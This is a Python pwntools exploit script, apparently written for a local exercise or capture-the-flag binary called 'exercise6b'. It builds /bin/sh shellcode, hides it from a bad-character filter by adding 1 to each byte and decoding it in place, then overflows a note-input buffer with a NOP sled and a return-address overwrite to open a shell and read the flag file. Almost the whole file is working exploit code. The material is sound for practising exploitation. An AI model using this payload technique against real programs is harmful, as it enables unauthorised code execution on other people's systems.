#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise6b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HEeeRE
#===========================================================
#"""
shellcode = b""
shellcode1 = b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73"  # \xb8
shellcode2 = b"\x68\x00\x99\x50\x54\x5f\x52\x5e" # \x00 \x99  
shellcode3 = b"\x6a\x3b\x58\x0f\x05"  # \x0f \x05
#"""

added_shellcode = b""
added_shellcode += b"\x49\xb9\x30\x63\x6a\x6f\x30\x74" 
added_shellcode += b"\x69\x01\x9a\x51\x55\x60\x53\x5f"
added_shellcode += b"\x6b\x3c\x59\x10\x06"


badchars = b'\x00\x05\n\r\x0f\x1e\x82\x8b\x91\x95\x99\x1e\xa4\xa6\xa9\xcd\xd2\xe6\xf6\xc8\xb8\xda\xbe\xd6\xc4\xcf\xc3\xce\xd9\xe0\xe9\xf3\xff'

"""
position = 0
for i in added_shellcode:
    if i in badchars:
        print(i)
        print(position)
    position+= 1
print("---x")
"""
#shellcode =  b""
#shellcode += b'\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc'
#shellcode +=asm('mov r12, 0x48b62f62732f6269')
#shellcode +=asm('mov [rcx+0x80], r12')
#shellcode +=asm('mov r12, 0x115b111111111111')
#shellcode +=asm('mov r13, 0x1155111111111111')
#shellcode +=asm('xor r12, r13')
#shellcode +=asm('xor [rcx+0x80], r12')
#shellcode += b'\xcc'
#shellcode +=asm('mov r12, 0x68040850545f525e')
#shellcode +=asm('mov [rcx+0x88], r12')
#shellcode +=asm('mov r12, 0x1112ac1111111111')
#shellcode +=asm('mov r11, 0x11163d1111111111')
#shellcode +=asm('xor r12, r11')
#shellcode +=asm('xor [rcx+0x88], r12')
#shellcode +=asm('mov r12, 0x6a3b582d07444444')
#shellcode +=asm('mov [rcx+0x90], r12')
#shellcode +=asm('mov r12, 0x1111113212222222')
#shellcode +=asm('mov r13, 0x1111111010666666')
#shellcode +=asm('xor r12, r13')
#shellcode +=asm('xor [rcx+0x90], r12')
#shellcode +=asm('jmp [rcx+0x80]')

shellcode = b""
shellcode +=asm('mov r13, 0x0101010101010101')
shellcode +=asm('sub [rcx+0x48], r13')
shellcode +=asm('mov r13, 0x0101010101010101')
shellcode +=asm('sub [rcx+0x50], r13')
shellcode +=asm('mov r13, 0x0101010101010101')
shellcode +=asm('sub [rcx+0x58], r13')



r = start()
jmp = 0x0000000000401616


shellc = b'\x90' * 40  + shellcode +b'\x90'*(14) + added_shellcode + b'\xcc' * (213-40+51 - 14 - len(added_shellcode) -len(shellcode)) + p64(jmp)


r.recvuntil(b'all notes:\n')
r.sendline(b'1')
r.recvuntil(b'your note:\n')

r.sendline(shellc)
r.sendline(b"cat flag")
r.sendline(b"exit")
print(r.recvall().decode(errors='ignore'))
# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()

